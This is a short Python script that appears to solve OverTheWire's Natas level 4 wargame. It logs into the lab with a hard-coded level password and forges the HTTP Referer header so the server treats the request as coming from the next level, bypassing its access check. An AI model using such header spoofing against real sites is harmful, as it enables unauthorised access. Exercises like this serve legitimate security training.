#!  usr/bin/env python
import requests
import re
username="natas4"
password="Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
# headers for http request 
headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username
response = requests.get(url , auth = (username , password) , headers = headers)
print (response.text)